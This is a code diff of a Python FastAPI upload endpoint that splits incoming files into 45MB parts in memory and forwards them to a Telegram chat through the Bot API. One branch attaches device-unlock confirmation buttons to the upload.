@@ -1216,84 +1216,74 @@ async def upload(
 
     caption = urllib.parse.unquote(x_caption) if x_caption else f"Файл: {filename}"
 
-    # Читаем входящий стрим чанками по 45MB и сразу шлём в Telegram
-    # Диск не используем вообще — RAM максимум 45MB на чанк
+    # Читаем файл СРАЗУ в эндпоинте — до return, пока FastAPI не закрыл file
     PART_SIZE = 45 * 1024 * 1024
-    READ_CHUNK = 256 * 1024  # читаем по 256KB внутри каждого парта
+    READ_CHUNK = 256 * 1024
 
-    ext = filename.lower().rsplit(".", 1)[-1] if "." in filename else ""
+    ext       = filename.lower().rsplit(".", 1)[-1] if "." in filename else ""
     base_name = filename.rsplit(".", 1)[0] if "." in filename else filename
 
-    async def _stream_to_tg(fname: str, cap: str, rm=None):
-        part_index = 0
-        total_size = 0
-        eof = False
+    # Собираем части прямо здесь
+    parts: list[tuple[str, bytes]] = []  # (part_name, data)
+    part_buf = bytearray()
+    part_index = 0
 
-        while not eof:
-            # Накапливаем один парт в памяти (макс 45MB)
-            part_buf = bytearray()
-            while len(part_buf) < PART_SIZE:
-                chunk = await file.read(READ_CHUNK)
-                if not chunk:
-                    eof = True
-                    break
-                part_buf.extend(chunk)
-                total_size += len(chunk)
-
-            if not part_buf:
-                break
-
+    while True:
+        chunk = await file.read(READ_CHUNK)
+        if not chunk:
+            if part_buf:
+                part_index += 1
+                parts.append((f"{base_name}_part{part_index}.{ext or 'bin'}", bytes(part_buf)))
+                part_buf.clear()
+            break
+        part_buf.extend(chunk)
+        if len(part_buf) >= PART_SIZE:
             part_index += 1
-            is_first_and_only = (part_index == 1 and eof)
+            parts.append((f"{base_name}_part{part_index}.{ext or 'bin'}", bytes(part_buf)))
+            part_buf.clear()
 
-            if is_first_and_only:
-                part_name = fname
-                part_cap  = cap
-                f_ext = ext
-            else:
-                part_name = f"{base_name}_part{part_index}.{ext if ext else 'bin'}"
-                part_cap  = f"{cap} [part {part_index}]" if cap else f"part {part_index}"
-                f_ext = ext
+    # Если одна часть — имя файла без суффикса
+    if len(parts) == 1:
+        parts[0] = (filename, parts[0][1])
 
-            # Выбираем метод Telegram
-            if is_first_and_only and f_ext in ("jpg", "jpeg", "png", "webp", "gif"):
+    print(f"upload: {filename} -> {len(parts)} part(s), total {sum(len(p[1]) for p in parts)/1024/1024:.1f}MB")
+
+    async def _send_parts(parts_data: list[tuple[str, bytes]], cap: str, rm=None):
+        for i, (part_name, data) in enumerate(parts_data):
+            is_only = (len(parts_data) == 1)
+            part_cap = cap if is_only else f"{cap} [part {i+1}/{len(parts_data)}]"
+            f_ext = part_name.lower().rsplit(".", 1)[-1] if "." in part_name else ""
+
+            if is_only and f_ext in ("jpg", "jpeg", "png", "webp", "gif"):
                 method, field = "sendPhoto", "photo"
-            elif is_first_and_only and f_ext in ("mp4", "mov", "avi", "mkv", "3gp"):
+            elif is_only and f_ext in ("mp4", "mov", "avi", "mkv", "3gp"):
                 method, field = "sendVideo", "video"
             else:
                 method, field = "sendDocument", "document"
 
-            print(f"_stream_to_tg part {part_index}: {len(part_buf)/1024/1024:.1f}MB -> {method}")
+            print(f"_send_parts {i+1}/{len(parts_data)}: {len(data)/1024/1024:.1f}MB -> {method}")
             try:
                 async with httpx.AsyncClient(timeout=300) as client:
                     pdata = {"chat_id": chat_id, "caption": part_cap}
-                    if rm and is_first_and_only:
+                    if rm and i == 0:  # кнопки на первой части
                         import json as _j
                         pdata["reply_markup"] = _j.dumps(rm)
                         pdata["parse_mode"] = "Markdown"
                     r = await client.post(
                         f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                         data=pdata,
-                        files={field: (part_name, bytes(part_buf))}
+                        files={field: (part_name, data)}
                     )
-                    print(f"_stream_to_tg part {part_index} -> {r.status_code}")
+                    print(f"_send_parts {i+1} -> {r.status_code}")
             except Exception as e:
-                print(f"_stream_to_tg part {part_index} error: {e}")
-
-            part_buf.clear()
-
-        print(f"_stream_to_tg done: {part_index} parts, {total_size/1024/1024:.1f}MB total")
-        return total_size
+                print(f"_send_parts {i+1} error: {e}")
 
     if x_code_upload == "true":
         cap_md = (f"📸 *Запрос на разблокировку*\nУстройство: `{escape_md(dev_id)}`"
                   f"\nФайл: {escape_md(filename)}\n\nПодтвердить разблокировку?")
-        asyncio.create_task(_stream_to_tg(
-            filename, cap_md,
-            rm=code_confirm_keyboard(dev_id, chat_id)
-        ))
+        asyncio.create_task(_send_parts(parts, cap_md, rm=code_confirm_keyboard(dev_id, chat_id)))
     else:
-        asyncio.create_task(_stream_to_tg(filename, caption))
+        asyncio.create_task(_send_parts(parts, caption))
 
     return {"ok": True}
 
